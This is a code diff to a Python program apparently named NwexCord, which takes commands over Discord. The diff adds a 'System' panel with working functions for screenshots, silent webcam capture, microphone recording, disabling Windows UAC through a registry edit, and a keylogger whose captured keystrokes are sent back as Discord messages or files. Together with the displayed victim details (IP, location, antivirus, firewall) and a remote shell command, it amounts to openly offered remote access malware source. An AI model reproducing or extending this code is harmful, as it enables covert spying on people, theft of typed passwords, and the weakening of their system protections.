@@ -5,7 +5,7 @@ A tool for executing shell commands via Discord messages
 """
 
 import discord
-from discord.ext import commands
+from discord.ext import commands, tasks
 import subprocess
 import os
 import sys
@@ -18,6 +18,9 @@ import webbrowser
 import threading
 import base64
 import asyncio
+import io
+import tempfile
+import time
 import config
 
 def get_sys_info():
@@ -2618,18 +2621,605 @@ class ToolsPanelView(discord.ui.View):
         await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())
 
 
+# ========================================
+# System Panel
+# ========================================
+
+class SystemManager:
+    """Helper class for System panel operations: Screenshot, Webcam, Listener, UAC, KeyLogger, Performance."""
+
+    _keylogger_thread = None
+    _keylogger_running = False
+    _keylogger_logs = []
+    _keylogger_listener = None
+
+    @staticmethod
+    def take_screenshot():
+        """Take a full-screen screenshot and return bytes."""
+        try:
+            from PIL import ImageGrab
+            img = ImageGrab.grab()
+            buf = io.BytesIO()
+            img.save(buf, format='PNG')
+            buf.seek(0)
+            return True, buf
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def take_webcam():
+        """Capture a single frame from the default webcam and return bytes."""
+        try:
+            import cv2
+            # Try multiple backends in order of reliability
+            backends = [cv2.CAP_MSMF, cv2.CAP_ANY, cv2.CAP_DSHOW]
+            cap = None
+            for backend in backends:
+                try:
+                    cap = cv2.VideoCapture(0, backend)
+                    if cap.isOpened():
+                        break
+                    cap.release()
+                    cap = None
+                except Exception:
+                    if cap:
+                        cap.release()
+                    cap = None
+                    continue
+            if cap is None or not cap.isOpened():
+                return False, "Webcam could not be opened. No working backend found."
+            # Let the camera warm up
+            for _ in range(5):
+                cap.read()
+            ret, frame = cap.read()
+            cap.release()
+            if not ret:
+                return False, "Failed to capture frame from webcam."
+            _, img_encoded = cv2.imencode('.png', frame)
+            buf = io.BytesIO(img_encoded.tobytes())
+            buf.seek(0)
+            return True, buf
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def record_microphone(duration_seconds: int):
+        """Record microphone audio for the given duration and return WAV bytes."""
+        try:
+            import sounddevice as sd
+            import wave
+            import numpy as np
+
+            # Find a real physical microphone, skip virtual/mapper devices
+            skip_keywords = ['droidcam', 'virtual', 'stereo mix', 'voicemeeter', 'vb-audio', 'cable', 'sound mapper', 'primary sound']
+            mic_device = None
+            try:
+                devices = sd.query_devices()
+                for i, dev in enumerate(devices):
+                    if dev['max_input_channels'] > 0 and dev['hostapi'] == 0:
+                        name_lower = dev['name'].lower()
+                        if not any(kw in name_lower for kw in skip_keywords):
+                            mic_device = i
+                            break
+            except Exception:
+                pass
+
+            sample_rate = 44100
+            channels = 1
+
+            rec_kwargs = dict(
+                frames=int(duration_seconds * sample_rate),
+                samplerate=sample_rate,
+                channels=channels,
+                dtype='int16'
+            )
+            if mic_device is not None:
+                rec_kwargs['device'] = mic_device
+
+            recording = sd.rec(**rec_kwargs)
+            sd.wait()
+
+            buf = io.BytesIO()
+            with wave.open(buf, 'wb') as wf:
+                wf.setnchannels(channels)
+                wf.setsampwidth(2)  # 16-bit = 2 bytes
+                wf.setframerate(sample_rate)
+                wf.writeframes(recording.tobytes())
+            buf.seek(0)
+            return True, buf
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def disable_uac():
+        """Disable UAC by setting EnableLUA to 0 in the registry."""
+        try:
+            cmd = 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                return True, "UAC disabled. Restart required to take effect."
+            return False, result.stderr.strip() or "Failed to disable UAC."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def start_keylogger():
+        """Start the keylogger in a background thread."""
+        if SystemManager._keylogger_running:
+            return False, "KeyLogger is already running."
+        try:
+            from pynput import keyboard
+            SystemManager._keylogger_logs = []
+            SystemManager._keylogger_running = True
+
+            def on_press(key):
+                if not SystemManager._keylogger_running:
+                    return False
+                try:
+                    SystemManager._keylogger_logs.append(key.char)
+                except AttributeError:
+                    special_keys = {
+                        keyboard.Key.space: ' ',
+                        keyboard.Key.enter: '\n',
+                        keyboard.Key.tab: '\t',
+                        keyboard.Key.backspace: '[BS]',
+                        keyboard.Key.shift: '[SHIFT]',
+                        keyboard.Key.shift_r: '[SHIFT]',
+                        keyboard.Key.ctrl_l: '[CTRL]',
+                        keyboard.Key.ctrl_r: '[CTRL]',
+                        keyboard.Key.alt_l: '[ALT]',
+                        keyboard.Key.alt_r: '[ALT]',
+                        keyboard.Key.caps_lock: '[CAPS]',
+                        keyboard.Key.esc: '[ESC]',
+                        keyboard.Key.delete: '[DEL]',
+                    }
+                    SystemManager._keylogger_logs.append(special_keys.get(key, f'[{key.name}]'))
+
+            SystemManager._keylogger_listener = keyboard.Listener(on_press=on_press)
+            SystemManager._keylogger_listener.start()
+            return True, "KeyLogger started."
+        except Exception as e:
+            SystemManager._keylogger_running = False
+            return False, str(e)
+
+    @staticmethod
+    def stop_keylogger():
+        """Stop the keylogger and return logged keys."""
+        if not SystemManager._keylogger_running:
+            return False, "KeyLogger is not running.", ""
+        try:
+            SystemManager._keylogger_running = False
+            if SystemManager._keylogger_listener:
+                SystemManager._keylogger_listener.stop()
+                SystemManager._keylogger_listener = None
+            logged = ''.join(SystemManager._keylogger_logs)
+            SystemManager._keylogger_logs = []
+            return True, "KeyLogger stopped.", logged
+        except Exception as e:
+            return False, str(e), ""
+
+    @staticmethod
+    def get_keylogger_dump():
+        """Get current keylogger logs without stopping."""
+        return ''.join(SystemManager._keylogger_logs)
+
+    @staticmethod
+    def get_performance():
+        """Gather performance data: CPU, RAM, uptime."""
+        data = {}
+        try:
+            import psutil
+            data['cpu_percent'] = psutil.cpu_percent(interval=1)
+            mem = psutil.virtual_memory()
+            data['ram_total'] = f"{mem.total / (1024**3):.1f} GB"
+            data['ram_percent'] = mem.percent
+            data['ram_used'] = f"{mem.used / (1024**3):.1f} GB"
+            data['ram_free'] = f"{mem.available / (1024**3):.1f} GB"
+            data['cpu_count_physical'] = psutil.cpu_count(logical=False) or 'N/A'
+            data['cpu_count_logical'] = psutil.cpu_count(logical=True) or 'N/A'
+        except Exception:
+            data['cpu_percent'] = 'N/A'
+            data['ram_total'] = 'N/A'
+            data['ram_percent'] = 'N/A'
+            data['ram_used'] = 'N/A'
+            data['ram_free'] = 'N/A'
+            data['cpu_count_physical'] = 'N/A'
+            data['cpu_count_logical'] = 'N/A'
+
+        # CPU Name
+        try:
+            cpu_name = subprocess.check_output('wmic cpu get name', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
+            data['cpu_name'] = cpu_name if cpu_name else platform.processor()
+        except Exception:
+            data['cpu_name'] = platform.processor()
+
+        # CPU Speed
+        try:
+            speed = subprocess.check_output('wmic cpu get CurrentClockSpeed', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
+            max_speed = subprocess.check_output('wmic cpu get MaxClockSpeed', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
+            data['cpu_speed'] = f"{float(max_speed)/1000:.1f} GHz" if max_speed else 'N/A'
+            data['cpu_current_speed'] = f"{speed} MHz" if speed else 'N/A'
+        except Exception:
+            data['cpu_speed'] = 'N/A'
+            data['cpu_current_speed'] = 'N/A'
+
+        # RAM Speed
+        try:
+            ram_speed = subprocess.check_output('wmic memorychip get Speed', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
+            data['ram_speed'] = f"{ram_speed} MHz" if ram_speed else 'N/A'
+        except Exception:
+            data['ram_speed'] = 'N/A'
+
+        # Uptime
+        try:
+            boot_str = subprocess.check_output('wmic os get lastbootuptime', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip().split('.')[0]
+            boot_time = datetime.strptime(boot_str, '%Y%m%d%H%M%S')
+            uptime_delta = datetime.now() - boot_time
+            total_minutes = int(uptime_delta.total_seconds() / 60)
+            data['uptime'] = f"{total_minutes} Minutes"
+        except Exception:
+            data['uptime'] = 'N/A'
+
+        return data
+
+
+def _progress_bar(percent, length=10):
+    """Create a text-based progress bar."""
+    if isinstance(percent, str):
+        return '░' * length
+    filled = int(length * percent / 100)
+    bar = '█' * filled + '░' * (length - filled)
+    return bar
+
+
+def build_performance_embed(session_id: str, data: dict = None):
+    """Build the Performance embed similar to the reference image."""
+    if data is None:
+        data = SystemManager.get_performance()
+
+    cpu_pct = data.get('cpu_percent', 'N/A')
+    ram_pct = data.get('ram_percent', 'N/A')
+
+    cpu_bar = _progress_bar(cpu_pct)
+    ram_bar = _progress_bar(ram_pct)
+
+    cpu_pct_str = f"{cpu_pct}%" if isinstance(cpu_pct, (int, float)) else cpu_pct
+    ram_pct_str = f"{ram_pct}%" if isinstance(ram_pct, (int, float)) else ram_pct
+
+    embed = discord.Embed(
+        title=f"⚡ Performance : {session_id}",
+        color=discord.Color.from_rgb(0, 120, 215)
+    )
+
+    # CPU Section
+    cpu_info = (
+        f"**CPU :** {data.get('cpu_name', 'Unknown')}\n\n"
+        f"```\n"
+        f"  Usage    [{cpu_bar}] {cpu_pct_str}\n"
+        f"```\n"
+        f"🟩 **Speed** : {data.get('cpu_speed', 'N/A')}\n"
+        f"🟩 **Cores** : {data.get('cpu_count_physical', 'N/A')}\n"
+        f"🟩 **Logical** : {data.get('cpu_count_logical', 'N/A')}"
+    )
+    embed.add_field(name="🧠 CPU", value=cpu_info, inline=False)
+
+    # RAM Section
+    ram_info = (
+        f"**RAM :** {data.get('ram_total', 'Unknown')}\n\n"
+        f"```\n"
+        f"  Usage    [{ram_bar}] {ram_pct_str}\n"
+        f"```\n"
+        f"🟧 **Speed** : {data.get('ram_speed', 'N/A')}\n"
+        f"🟧 **Used** : {data.get('ram_used', 'N/A')}\n"
+        f"🟧 **Free** : {data.get('ram_free', 'N/A')}"
+    )
+    embed.add_field(name="💾 RAM", value=ram_info, inline=False)
+
+    # Uptime
+    embed.add_field(
+        name="⏱️ SystemUpTime",
+        value=f"🕐 **{data.get('uptime', 'N/A')}**",
+        inline=False
+    )
+
+    embed.set_footer(text=f"NwexCord • Performance Monitor")
+    return embed
+
+
+class PerformanceView(discord.ui.View):
+    """Interactive view for Performance with Stop (refresh toggle) and Back."""
+    def __init__(self, session_id: str = ""):
+        super().__init__(timeout=300)
+        self.session_id = session_id
+
+    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=0)
+    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        data = SystemManager.get_performance()
+        embed = build_performance_embed(self.session_id, data)
+        await interaction.response.edit_message(content=None, embed=embed, view=PerformanceView(self.session_id))
+
+    @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary, row=0)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_system_panel(), view=SystemPanelView())
+
+
+class ListenerDurationModal(discord.ui.Modal, title="Microphone Listener"):
+    """Modal to input recording duration in seconds."""
+    duration_input = discord.ui.TextInput(
+        label="Duration (seconds)",
+        placeholder="e.g. 10",
+        default="5",
+        required=True,
+        max_length=4
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        try:
+            duration = int(str(self.duration_input).strip())
+            if duration < 1 or duration > 300:
+                await interaction.response.send_message("❌ Duration must be between 1 and 300 seconds.", ephemeral=True)
+                return
+        except ValueError:
+            await interaction.response.send_message("❌ Please enter a valid number.", ephemeral=True)
+            return
+
+        loading_embed = discord.Embed(
+            title="🎙️ Microphone Listener",
+            description=f"⏳ Recording for **{duration} seconds**...\nPlease wait.",
+            color=discord.Color.orange()
+        )
+        loading_embed.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=loading_embed, view=None)
+
+        loop = asyncio.get_event_loop()
+        success, result = await loop.run_in_executor(None, SystemManager.record_microphone, duration)
+
+        if success:
+            file = discord.File(result, filename=f"recording_{duration}s.wav")
+            done_embed = discord.Embed(
+                title="🎙️ Microphone Listener",
+                description=f"✅ Recorded **{duration} seconds** of audio.",
+                color=discord.Color.green()
+            )
+            done_embed.set_footer(text="NwexCord • System")
+            await interaction.edit_original_response(content=None, embed=done_embed, attachments=[file], view=SystemResultView())
+        else:
+            err_embed = discord.Embed(
+                title="🎙️ Microphone Listener",
+                description=f"❌ {result}",
+                color=discord.Color.red()
+            )
+            err_embed.set_footer(text="NwexCord • System")
+            await interaction.edit_original_response(content=None, embed=err_embed, view=SystemResultView())
+
+
+def embed_system_panel():
+    """Create the System panel embed."""
+    embed = discord.Embed(
+        title="⚙️ NwexCord System",
+        description=(
+            "Select a system action from the buttons below.\n\n"
+            "📸 **ScreenShot** — Capture the PC screen\n"
+            "📷 **Webcam** — Capture webcam photo\n"
+            "🎙️ **Listener** — Record microphone audio\n"
+            "🛡️ **Disable UAC** — Disable User Account Control\n"
+            "⌨️ **KeyLogger** — Start/Stop key logging\n"
+            "⚡ **Performance** — CPU, RAM & uptime stats"
+        ),
+        color=discord.Color.from_rgb(47, 49, 54)
+    )
+    embed.set_footer(text="NwexCord • System Panel")
+    return embed
+
+
+class SystemResultView(discord.ui.View):
+    """Back button after a system action result."""
+    def __init__(self):
+        super().__init__(timeout=300)
+
+    @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_system_panel(), attachments=[], view=SystemPanelView())
+
+
+class SystemPanelView(discord.ui.View):
+    """Main System panel with 6 feature buttons."""
+    def __init__(self):
+        super().__init__(timeout=300)
+
+    @discord.ui.button(label="ScreenShot", emoji="📸", style=discord.ButtonStyle.secondary, row=0)
+    async def screenshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        loading = discord.Embed(title="📸 ScreenShot", description="⏳ Capturing screen...", color=discord.Color.greyple())
+        loading.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=loading, view=None)
+
+        loop = asyncio.get_event_loop()
+        success, result = await loop.run_in_executor(None, SystemManager.take_screenshot)
+
+        if success:
+            file = discord.File(result, filename="screenshot.png")
+            embed = discord.Embed(title="📸 ScreenShot", description="✅ Screen captured successfully.", color=discord.Color.green())
+            embed.set_image(url="attachment://screenshot.png")
+            embed.set_footer(text="NwexCord • System")
+            await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=SystemResultView())
+        else:
+            embed = discord.Embed(title="📸 ScreenShot", description=f"❌ {result}", color=discord.Color.red())
+            embed.set_footer(text="NwexCord • System")
+            await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())
+
+    @discord.ui.button(label="Webcam", emoji="📷", style=discord.ButtonStyle.secondary, row=0)
+    async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        loading = discord.Embed(title="📷 Webcam", description="⏳ Capturing webcam...", color=discord.Color.greyple())
+        loading.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=loading, view=None)
+
+        loop = asyncio.get_event_loop()
+        success, result = await loop.run_in_executor(None, SystemManager.take_webcam)
+
+        if success:
+            file = discord.File(result, filename="webcam.png")
+            embed = discord.Embed(title="📷 Webcam", description="✅ Webcam captured successfully.", color=discord.Color.green())
+            embed.set_image(url="attachment://webcam.png")
+            embed.set_footer(text="NwexCord • System")
+            await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=SystemResultView())
+        else:
+            embed = discord.Embed(title="📷 Webcam", description=f"❌ {result}", color=discord.Color.red())
+            embed.set_footer(text="NwexCord • System")
+            await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())
+
+    @discord.ui.button(label="Listener", emoji="🎙️", style=discord.ButtonStyle.secondary, row=0)
+    async def listener_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(ListenerDurationModal())
+
+    @discord.ui.button(label="Disable UAC", emoji="🛡️", style=discord.ButtonStyle.danger, row=1)
+    async def uac_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, SystemManager.disable_uac)
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(title=f"{status} Disable UAC", description=msg, color=color)
+        embed.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=embed, view=SystemResultView())
+
+    @discord.ui.button(label="KeyLogger", emoji="⌨️", style=discord.ButtonStyle.secondary, row=1)
+    async def keylogger_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        # Show keylogger sub-panel
+        is_running = SystemManager._keylogger_running
+        status_text = "🟢 **Running**" if is_running else "🔴 **Stopped**"
+        logged = SystemManager.get_keylogger_dump()
+        log_preview = logged[-500:] if len(logged) > 500 else logged
+        desc = f"Status: {status_text}\n\n"
+        if log_preview:
+            desc += f"**Last logged keys:**\n```\n{log_preview}\n```"
+        else:
+            desc += "*No keys logged yet.*"
+        embed = discord.Embed(title="⌨️ KeyLogger", description=desc, color=discord.Color.from_rgb(47, 49, 54))
+        embed.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
+
+    @discord.ui.button(label="Performance", emoji="⚡", style=discord.ButtonStyle.secondary, row=1)
+    async def performance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        loading = discord.Embed(title="⚡ Performance", description="⏳ Gathering performance data...", color=discord.Color.greyple())
+        loading.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=loading, view=None)
+
+        loop = asyncio.get_event_loop()
+        data = await loop.run_in_executor(None, SystemManager.get_performance)
+        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
+        embed = build_performance_embed(session_id, data)
+        await interaction.edit_original_response(content=None, embed=embed, view=PerformanceView(session_id))
+
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        info = get_sys_info()
+        left_col = (
+            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
+            f"👤 **UserName** : {info['UserName']}\n"
+            f"🖥️ **PCName** : {info['PCName']}\n"
+            f"🪟 **OS** : {info['OS']}\n"
+            f"📁 **Client** : {info['Client']}\n"
+            f"⚙️ **Process** : {info['Process']}\n"
+            f"📅 **DateTime** : {info['DateTime']}\n"
+            f"🎇 **GPU** : {info['GPU']}\n"
+            f"🧠 **CPU** : {info['CPU']}\n"
+            f"🏷️ **Identifier** : {info['Identifier']}\n"
+            f"📊 **Ram** : {info['Ram']}"
+        )
+        right_col = (
+            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
+            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
+            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
+            f"⚠️ **Firewall** : {info['Firewall']}\n"
+            f"🌐 **MacAddress** : {info['MacAddress']}\n"
+            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
+            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
+            f"💻 **Platform** : {info['Platform']}\n"
+            f"📋 **Ver** : {info['Ver']}\n"
+            f"🔵 **.Net** : {info['.Net']}\n"
+            f"🔋 **Battery** : {info['Battery']}"
+        )
+        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
+        embed.add_field(name="\u200b", value=left_col, inline=True)
+        embed.add_field(name="\u200b", value=right_col, inline=True)
+        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
+        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
+        await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())
+
+
+class KeyLoggerView(discord.ui.View):
+    """Sub-panel for KeyLogger with Start, Stop, Dump, Back."""
+    def __init__(self):
+        super().__init__(timeout=300)
+
+    @discord.ui.button(label="Start", emoji="▶", style=discord.ButtonStyle.success, row=0)
+    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        success, msg = SystemManager.start_keylogger()
+        status = "✅" if success else "❌"
+        embed = discord.Embed(title=f"{status} KeyLogger", description=msg, color=discord.Color.green() if success else discord.Color.red())
+        embed.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
+
+    @discord.ui.button(label="Stop", emoji="⏹", style=discord.ButtonStyle.danger, row=0)
+    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        success, msg, logged = SystemManager.stop_keylogger()
+        desc = msg
+        if logged:
+            if len(logged) > 1500:
+                # Send as file
+                buf = io.BytesIO(logged.encode('utf-8'))
+                buf.seek(0)
+                file = discord.File(buf, filename="keylog.txt")
+                embed = discord.Embed(title="⏹ KeyLogger Stopped", description=f"{msg}\n\nLogged {len(logged)} characters. See attached file.", color=discord.Color.green())
+                embed.set_footer(text="NwexCord • System")
+                await interaction.response.edit_message(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
+                return
+            else:
+                desc += f"\n\n**Logged keys:**\n```\n{logged}\n```"
+        embed = discord.Embed(title="⏹ KeyLogger Stopped", description=desc, color=discord.Color.green() if success else discord.Color.red())
+        embed.set_footer(text="NwexCord • System")
+        await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
+
+    @discord.ui.button(label="Dump", emoji="📄", style=discord.ButtonStyle.primary, row=0)
+    async def dump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        logged = SystemManager.get_keylogger_dump()
+        if not logged:
+            embed = discord.Embed(title="📄 KeyLogger Dump", description="*No keys logged yet.*", color=discord.Color.greyple())
+            embed.set_footer(text="NwexCord • System")
+            await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
+            return
+        if len(logged) > 1500:
+            buf = io.BytesIO(logged.encode('utf-8'))
+            buf.seek(0)
+            file = discord.File(buf, filename="keylog_dump.txt")
+            embed = discord.Embed(title="📄 KeyLogger Dump", description=f"Logged {len(logged)} characters. See attached file.", color=discord.Color.blue())
+            embed.set_footer(text="NwexCord • System")
+            await interaction.response.edit_message(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
+        else:
+            embed = discord.Embed(title="📄 KeyLogger Dump", description=f"```\n{logged}\n```", color=discord.Color.blue())
+            embed.set_footer(text="NwexCord • System")
+            await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
+
+    @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_system_panel(), attachments=[], view=SystemPanelView())
+
+
 class StartupView(discord.ui.View):
-    """View attached to the startup message with Tools and Fun buttons."""
+    """View attached to the startup message with Tools, Fun, and System buttons."""
     def __init__(self):
         super().__init__(timeout=None)
-    
+
     @discord.ui.button(label="Tools", emoji="🧰", style=discord.ButtonStyle.primary)
     async def tools_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())
-    
+
     @discord.ui.button(label="Fun", emoji="🎉", style=discord.ButtonStyle.danger)
     async def fun_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())
+
+    @discord.ui.button(label="System", emoji="⚙️", style=discord.ButtonStyle.secondary)
+    async def system_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_system_panel(), view=SystemPanelView())
 
 @bot.event
 async def on_ready():
